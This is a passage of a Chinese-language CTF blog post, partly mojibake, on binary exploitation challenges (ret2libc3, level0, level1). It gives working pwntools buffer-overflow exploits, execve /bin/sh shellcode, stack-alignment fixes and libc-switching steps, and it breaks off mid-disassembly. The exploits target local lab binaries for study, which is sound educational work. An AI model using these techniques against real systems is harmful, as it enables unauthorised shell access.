class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>a = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(a)<span class="hljs-comment">#134504882</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a))<span class="hljs-comment">#&lt;class &#x27;int&#x27;&gt;</span><br><br>b = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>)))<br><span class="hljs-built_in">print</span>(b)<span class="hljs-comment">#0x80461b2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(b))<span class="hljs-comment">#&lt;class &#x27;str&#x27;&gt;</span><br><br>c = <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(c)<span class="hljs-comment">#16</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-number">0x10</span>))<span class="hljs-comment">#&lt;class &#x27;int&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p><code>libc</code> ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå¯¼è‡´æ‰“ä¸é€šã€‚</p><blockquote><p>æœ¬åœ°ï¼š<code>libc-2.31.so</code> ï¼Œè¿œç«¯ï¼š<code>libc-2.23.so</code> ï¼‰</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, <span class="hljs-built_in">str</span>(elf.got[<span class="hljs-string">&quot;puts&quot;</span>]))<br>io.recvuntil(<span class="hljs-string">b&#x27; : &#x27;</span>)<br>libcbase = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>) - libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_got = libcbase + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>payload = flat([cyclic(<span class="hljs-number">60</span>), system_got, <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh\x00&quot;</span>))])<br><br>io.sendlineafter(<span class="hljs-string">b&#x27; :&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="åŠ è½½æŒ‡å®šlibcç‰ˆæœ¬"><a href="#åŠ è½½æŒ‡å®šlibcç‰ˆæœ¬" class="headerlink" title="åŠ è½½æŒ‡å®šlibcç‰ˆæœ¬"></a>åŠ è½½æŒ‡å®šlibcç‰ˆæœ¬</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>è®©ç¨‹åºå¼ºè¡ŒåŠ è½½ç‰¹å®šç‰ˆæœ¬ <code>glibc</code>ï¼Œé€šè¿‡ <code>LD_LIBRARY_PATH</code> æˆ–è€… <code>LD_PRELOAD</code> ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>å› ä¸º <code>ld.so</code> å’Œ <code>libc.so</code> ä¸åŒ¹é…çš„åŸå› ï¼Œå¦‚æœç‰ˆæœ¬å·®å¤ªè¿œå¯èƒ½è¡Œä¸é€šã€‚å¯ä»¥å°†é…å¥—çš„ <code>ld</code> å’Œ <code>libc</code> ä¸€èµ·ä½¿ç”¨å³å¯å®ç°åŠ¨æ€åŠ è½½ <code>libc</code> ã€‚</p><p>åœ¨ <code>pwntools</code> å¯åŠ¨ç¨‹åºæ—¶ï¼Œå¯ä»¥æŒ‰ç…§ä¸‹é¢çš„ä»£ç è¿›è¡Œè®¾ç½®ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">io = process([&quot;/home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2&quot;, &quot;./ret2libc3&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)<br></code></pre></td></tr></table></figure><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>ç”¨ <code>patchelf</code> å’Œ <code>glibc-all-in-one</code> æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><h4 id="GitHub-åœ°å€"><a href="#GitHub-åœ°å€" class="headerlink" title="GitHub åœ°å€"></a>GitHub åœ°å€</h4><p>patchelfï¼š<a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p><p>glibc-all-in_oneï¼š<a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p><h4 id="libc-ä¸‹è½½"><a href="#libc-ä¸‹è½½" class="headerlink" title="libc ä¸‹è½½"></a>libc ä¸‹è½½</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> glibc-all-in-one</span><br><span class="hljs-meta">$</span><span class="bash"> ./update_list<span class="hljs-comment">#æ›´æ–°æœ€æ–°ç‰ˆæœ¬çš„ glibc ç›®å½•</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat list <span class="hljs-comment">#æŸ¥çœ‹å¯ä¸‹è½½çš„ glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./download 2.23-0ubuntu11.3_i386<span class="hljs-comment">#ä¸‹è½½æƒ³è¦çš„ glibc</span></span><br></code></pre></td></tr></table></figure><p>æ›´å¤šè¯´æ˜è¯·è¿›å…¥ github æŸ¥çœ‹ï¼š<a href="https://github.com/matrix1001/glibc-all-in-one">https://github.com/matrix1001/glibc-all-in-one</a></p><h4 id="æ›´æ”¹-elf-æ–‡ä»¶çš„-ld-å’Œ-libc"><a href="#æ›´æ”¹-elf-æ–‡ä»¶çš„-ld-å’Œ-libc" class="headerlink" title="æ›´æ”¹ elf æ–‡ä»¶çš„ ld å’Œ libc"></a>æ›´æ”¹ elf æ–‡ä»¶çš„ ld å’Œ libc</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span> <br>linux-gate.so.1 (0xf7fa6000)<br>libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7da1000)<br>/lib/ld-linux.so.2 (0xf7fa7000)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --replace-needed libc.so.6 /home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2libc3/libc-2.23.so ret2libc3</span>       <br><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span>     <br>linux-gate.so.1 (0xf7f71000)<br>/home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2libc3/libc-2.23.so (0xf7db8000)<br>/lib/ld-linux.so.2 (0xf7f72000)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --set-interpreter /home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2</span> <br><span class="hljs-meta">$</span><span class="bash"> ldd ret2libc3</span><br>linux-gate.so.1 (0xf7f59000)<br>/home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2libc3/libc-2.23.so (0xf7da0000)<br>/home/pwn/Software/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-linux.so.2 =&gt; /lib/ld-linux.so.2 (0xf7f5a000)<br></code></pre></td></tr></table></figure><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./level0&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;World\n&#x27;</span>)<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(callsys_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>æ ˆå¯¹é½å¯¼è‡´ exp æ‰“ä¸é€šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./level0&#x27;</span>)<br>io.recvline()<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>ret = <span class="hljs-number">0x00400431</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(ret) + p64(callsys_addr)<br><span class="hljs-comment"># callsys_addr = 0x00400597/A</span><br><span class="hljs-comment"># payload = b&#x27;A&#x27; * (0x80 + 0x8) + p64(callsys_addr)</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">00:0000â”‚ rsi rsp  0x7fffffffded0 â—‚â€” &#x27;AAAAAAAA\n&#x27;<br>01:0008â”‚          0x7fffffffded8 â—‚â€” 0xa /* &#x27;\n&#x27; */<br>02:0010â”‚          0x7fffffffdee0 â—‚â€” 0x0<br>... â†“<br>08:0040â”‚          0x7fffffffdf10 â€”â–¸ 0x400040 â—‚â€” 0x500000006<br>09:0048â”‚          0x7fffffffdf18 â—‚â€” 0xf0b5ff<br>0a:0050â”‚          0x7fffffffdf20 â—‚â€” 0xc2<br>0b:0058â”‚          0x7fffffffdf28 â€”â–¸ 0x7fffffffdf57 â—‚â€” 0x4005f300<br>0c:0060â”‚          0x7fffffffdf30 â—‚â€” 0x1<br>0d:0068â”‚          0x7fffffffdf38 â€”â–¸ 0x40064d (__libc_csu_init+77) â—‚â€” add    rbx, 1<br>0e:0070â”‚          0x7fffffffdf40 â€”â–¸ 0x400600 (__libc_csu_init) â—‚â€” push   r15<br>0f:0078â”‚          0x7fffffffdf48 â€”â–¸ 0x7ffff7ffe190 â—‚â€” 0x0<br>10:0080â”‚ rbp      0x7fffffffdf50 â€”â–¸ 0x7fffffffdf70 â—‚â€” 0x0<br>11:0088â”‚          0x7fffffffdf58 â€”â–¸ 0x4005f3 (main+45) â—‚â€” leave<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = gdb.debug(<span class="hljs-string">&quot;./level0&quot;</span>,<span class="hljs-string">&quot;b *0x0040059A&quot;</span>)<br><br>callsys_addr = <span class="hljs-number">0x00400596</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) + p64(callsys_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> â–º <span class="hljs-number">0x7fb830d3ffbc</span> &lt;do_system+<span class="hljs-number">364</span>&gt;    <span class="hljs-keyword">movaps</span> xmmword <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">0x50</span>], <span class="hljs-built_in">xmm0</span><br>   <span class="hljs-number">0x7fb830d3ffc1</span> &lt;do_system+<span class="hljs-number">369</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span> + <span class="hljs-number">0x68</span>], <span class="hljs-number">0</span><br>   <span class="hljs-number">0x7fb830d3ffca</span> &lt;do_system+<span class="hljs-number">378</span>&gt;    <span class="hljs-keyword">call</span>   posix_spawn &lt;posix_spawn&gt;<br></code></pre></td></tr></table></figure><p>å¾—çŸ¥ <code>glibc2.27</code> ä»¥åå¼•å…¥ <code>xmmå¯„å­˜å™¨</code> ï¼Œè®°å½•ç¨‹åºçŠ¶æ€ï¼Œä¼šæ‰§è¡Œ movaps æŒ‡ä»¤ï¼Œè¦æ±‚ rsp æ˜¯æŒ‰ 16å­—èŠ‚å¯¹é½çš„ ã€‚</p><p>æ˜¯ xmmå¯„å­˜å™¨çš„é—®é¢˜ï¼Œå½“ glibc ç‰ˆæœ¬å¤§äº 2.27 çš„æ—¶å€™ï¼Œç³»ç»Ÿè°ƒç”¨ <code>system(&quot;/bin/sh&quot;)</code> ä¹‹å‰æœ‰ä¸ª xmm å¯„å­˜å™¨ä½¿ç”¨ã€‚è¦ç¡®ä¿ rsp æ˜¯ä¸ 16 å¯¹é½çš„ï¼Œä¹Ÿå°±æ˜¯æœ«å°¾å¿…é¡»æ˜¯ 0 ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/fjh1997/article/details/107695261">å…³äºjarvisOJ level0è¿œç¨‹æ‰“å¾—é€šæœ¬åœ°æ‰“ä¸é€šçš„é—®é¢˜_fjh1997çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://blog.csdn.net/weixin_42016744/article/details/122422452">pwn system(â€œ/bin/shâ€œ)å¤±è´¥çš„åŸå›  flypwnçš„åšå®¢-CSDNåšå®¢_system(/bin/sh)</a><br><a href="https://www.cnblogs.com/Rookle/p/12871878.html">åœ¨ä¸€äº›64ä½çš„glibcçš„payloadè°ƒç”¨systemå‡½æ•°å¤±è´¥é—®é¢˜ - Rookle - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="æ ˆçš„å¯¹é½é—®é¢˜"><a href="#æ ˆçš„å¯¹é½é—®é¢˜" class="headerlink" title="æ ˆçš„å¯¹é½é—®é¢˜"></a>æ ˆçš„å¯¹é½é—®é¢˜</h2><blockquote><p><a href="https://blog.csdn.net/tcctw/article/details/106827439">x86_64 Linux è¿è¡Œæ—¶æ ˆçš„å­—èŠ‚å¯¹é½_tcctwçš„åšå®¢-CSDNåšå®¢</a><br><a href="https://blog.csdn.net/qq_29328443/article/details/107232025">x86<em>64æ±‡ç¼–ä¹‹å››ï¼šå‡½æ•°è°ƒç”¨ã€è°ƒç”¨çº¦å®š ponnylvçš„åšå®¢-CSDNåšå®¢</em>æ±‡ç¼–è°ƒç”¨å‡½æ•°</a></p></blockquote><p>å…¶å®ï¼Œæ ˆçš„å¯¹é½é—®é¢˜æ¥æºäºä¸Šè¿°æ–‡æ¡£ä¸­çš„ä¸€æ®µè¯ï¼š</p><blockquote><p>In addition to registers, each function has a frame on the run-time stack. This stack grows downwards from high addresses. Figure 3.3 shows the stack organization. <strong>The end of the input argument area shall be aligned on a 16</strong> (32 or 64, if <strong>m256 or </strong>m512 is passed on stack) <strong>byte boundary</strong>. In other words, <strong>the value (%rsp + 8) is always a multiple of 16</strong> (32 or 64) <strong>when control is transferred to the function entry point.</strong> The stack pointer, %rsp, always points to the end of the latest allocated stack frame.</p></blockquote><p>System V AMD64 è°ƒç”¨çº¦å®šè¦æ±‚æ ˆå¿…é¡»æŒ‰16å­—èŠ‚å¯¹é½ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è°ƒç”¨callæŒ‡ä»¤ä¹‹å‰ï¼ˆthe end of the input argument areaï¼‰ï¼Œ%rspæŒ‡é’ˆå¿…é¡»æ˜¯16çš„å€æ•°ï¼ˆå¯¹åº”16è¿›åˆ¶æ˜¯æœ€å1ä½æ˜¯0ï¼‰ã€‚æŒ‰16å­—èŠ‚å¯¹é½çš„åŸå› æ˜¯ï¼Œç°ä»£ x86_64 è®¡ç®—æœºå¼•å…¥äº† SSE å’Œ AVX æŒ‡ä»¤ï¼Œè¿™äº›æŒ‡ä»¤æ”¯æŒ SIMDï¼Œèƒ½æå¤§æå‡å¤„ç†é€Ÿåº¦ã€‚ä½†æ˜¯è¿™äº›æŒ‡ä»¤è¦æ±‚å¿…é¡»ä»16å­—èŠ‚çš„æ•´æ•°å€çš„åœ°å€å¤„å–æ•°æ®ï¼Œä¸ºäº†é¡¾åŠè¿™äº›æŒ‡ä»¤ï¼Œæ‰æœ‰äº†ä¸Šè¿°å¯¹é½è¦æ±‚ã€‚</p><p>ä¸Šé¢è¿™æ®µæ–‡æ¡£ç¬¬äºŒå¥ä¸ºä»€ä¹ˆåˆè¯´æ˜¯ %rsp + 8 å¿…é¡»æ˜¯16çš„å€æ•°å‘¢ï¼Ÿå®é™…ä¸Šï¼Œå®ƒè¯´çš„%rspæ˜¯æ‰§è¡Œå®Œ call æŒ‡ä»¤ä¹‹åçš„ %rspï¼Œæ‰§è¡Œ call æŒ‡ä»¤ä¼šå¯¼è‡´æ ˆä¸­å‹å…¥ä¸€ä¸ª8ä¸ªå­—èŠ‚çš„è¿”å›åœ°å€ã€‚åŸæ¥ %rsp æ˜¯æŒ‰16å­—èŠ‚å¯¹é½çš„ï¼Œå‹å…¥8å­—èŠ‚åœ°å€åï¼Œæ˜¾ç„¶æ˜¯ %rsp + 8 æ‰æ˜¯16çš„å€æ•°ã€‚</p><p>æ­¤å¤–ï¼Œåœ¨è¯¥è°ƒç”¨çº¦å®šä¸‹ï¼Œå‡½æ•°çš„èµ·å§‹åœ°å€å§‹ç»ˆæ˜¯æŒ‰8å­—èŠ‚å¯¹é½çš„ï¼ˆmisaligned by 8 bytesï¼‰ï¼Œå³èµ·å§‹åœ°å€æ˜¯8çš„å€æ•°ã€‚ï¼ˆè‡³äºä¸ºä»€ä¹ˆå‡½æ•°èµ·å§‹åœ°å€æ˜¯8å­—èŠ‚å¯¹é½æ²¡å¤§çœ‹æ‡‚ï¼‰ã€‚</p><p>å‚è€ƒï¼š<a href="https://stackoverflow.com/a/56066628/6570986">https://stackoverflow.com/a/56066628/6570986</a></p><p>æ€»ç»“ä¸€ä¸‹ï¼Œå‡½æ•°èµ·å§‹åœ°å€æŒ‰8å­—èŠ‚å¯¹é½å’Œæ ˆæŒ‰16å­—èŠ‚å¯¹é½ è¿™ä¸¤ç‚¹æ˜¯æˆ‘ä»¬åœ¨ç¼–å†™æ±‡ç¼–ä»£ç æ—¶éœ€è¦æ³¨æ„çš„ï¼Œå¦‚æœä¸æ³¨æ„ï¼Œå°±ä¼šç¼–å†™å‡ºé”™è¯¯çš„ä»£ç ã€‚</p><p>æ›´å¤šå…³äºæ ˆçš„å¯¹é½ï¼Œå¯ä»¥å‚è€ƒï¼š</p><p><a href="https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack">https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack</a><br><a href="https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler">https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler</a><br><a href="https://nickdesaulniers.github.io/blog/2014/04/18/lets-write-some-x86-64/">https://nickdesaulniers.github.io/blog/2014/04/18/lets-write-some-x86-64/</a></p><h2 id="è§£å†³ä¸€ç§pwnæœ¬åœ°æ‰“ä¸é€šè¿œç¨‹æ‰“å¾—é€šçš„é—®é¢˜"><a href="#è§£å†³ä¸€ç§pwnæœ¬åœ°æ‰“ä¸é€šè¿œç¨‹æ‰“å¾—é€šçš„é—®é¢˜" class="headerlink" title="è§£å†³ä¸€ç§pwnæœ¬åœ°æ‰“ä¸é€šè¿œç¨‹æ‰“å¾—é€šçš„é—®é¢˜"></a>è§£å†³ä¸€ç§pwnæœ¬åœ°æ‰“ä¸é€šè¿œç¨‹æ‰“å¾—é€šçš„é—®é¢˜</h2><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/fjh1997/article/details/105347161">https://blog.csdn.net/fjh1997/article/details/105347161</a></p></blockquote><p>æœ€è¿‘å°±é‡åˆ°äº†è¿™æ ·çš„æ€ªé¢˜ç›®ï¼Œæœ¬åœ°åŠ«æŒæŒ‡é’ˆåˆ° <code>execve()</code> çš„ <code>int 80</code> ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œæœ¬åœ°ä¼šå¡ä½ï¼Œè¿œç¨‹å´å¯ä»¥ï¼Œæˆ‘çš„å»ºç«‹çš„ <code>shellcode</code> æ˜¯è¿™æ ·çš„ï¼š</p><pre><code>push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx, espxor ecx, ecxpush 0x8pop eaxinc eaxinc eaxinc eaxint 0x80</code></pre><p>ä¹‹åè°ƒè¯•çš„æ—¶å€™å‘ç°ï¼Œint è°ƒç”¨çš„æ—¶å€™ envp å‚æ•°æœ‰ç‚¹å¥‡æ€ªï¼Œæœ¬æ¥åº”è¯¥æ˜¯ 0ï¼Œç°åœ¨å´æ˜¯ The_Pursuit_of_happiness</p><p>è¿™ä¸ªæ—¶å€™æ‰æƒ³èµ·æ¥æˆ‘ envp æ²¡æœ‰æ¸…ç©ºï¼Œä¹Ÿå°±æ˜¯å°‘äº†ä¸€æ¡ <code>xor edx,edx</code> æŒ‡ä»¤ï¼Œä¹‹ååŠ ä¸Šå»åæœ¬åœ°å°±èƒ½æ‰“é€š ã€‚</p><pre><code>push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx, espxor ecx, ecxxor edx,edxpush 0x8pop eaxinc eaxinc eaxinc eaxint 0x80</code></pre><p>ç»¼ä¸Šæ‰€è¿° pwn æœ¬åœ°æ‰“ä¸é€šè¿œç¨‹æ‰“é€šçš„é—®é¢˜åŸå› ä¹‹ä¸€æ˜¯ç”±äºç¯å¢ƒå˜é‡æŒ‡é’ˆä¸ä¸€æ ·ï¼Œè¿œç¨‹çš„ç¯å¢ƒå˜é‡æŒ‡é’ˆå¯èƒ½æ°å¥½ç¬¦åˆè¿™ä¸ªç¨‹åºï¼Œè€Œæœ¬åœ°çš„ä¸ç¬¦åˆï¼Œæ‰€ä»¥è¦æ¸… 0ã€‚æ‰€ä»¥è¦æŒ‰ç…§ envp=0 è°ƒç”¨ ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(path=<span class="hljs-string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="hljs-string">&#x27;sh&#x27;</span>], envp=<span class="hljs-number">0</span>) <br></code></pre></td></tr></table></figure><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>io = gdb.debug(<span class="hljs-string">&quot;./level1&quot;</span>,<span class="hljs-string">&quot;b *0x080484B6&quot;</span>)<br><span class="hljs-comment">#io = process(&#x27;./level1&#x27;)</span><br>text = io.recvline()[<span class="hljs-number">14</span>: -<span class="hljs-number">2</span>]<br>buf_addr = <span class="hljs-built_in">int</span>(text, <span class="hljs-number">16</span>)<br><br>payload = shellcode + <span class="hljs-string">b&#x27;\x90&#x27;</span> * (<span class="hljs-number">0x88</span> + <span class="hljs-number">0x4</span> - <span class="hljs-built_in">len</span>(shellcode)) + p32(buf_addr)<br><span class="hljs-comment"># payload = b&#x27;\x90&#x27; * (0x88 + 0x4 - len(shellcode)) + shellcode + p32(buf_addr)# æ‰“ä¸é€š</span><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">  <span class="hljs-number">0xfff0a98c</span>    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span><br>  <span class="hljs-number">0xfff0a98e</span>    <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1010101</span><br>  <span class="hljs-number">0xfff0a993</span>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0x1016972</span><br>  <span class="hljs-number">0xfff0a99a</span>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xfff0a99c</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>   â†“<br>â–º <span class="hljs-number">0xfff0a99d</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>  <span class="hljs-number">0xfff0a99f</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebx</span> + <span class="hljs-number">0x68</span>], <span class="hljs-number">dh</span><br>  <span class="hljs-number">0xfff0a9a2</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>  <span class="hljs-number">0xfff0a9a4</span>    <span class="hljs-keyword">das</span>    <br>  <span class="hljs-number">0xfff0a9a5</span>    <span class="hljs-keyword">bound</span>  <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span 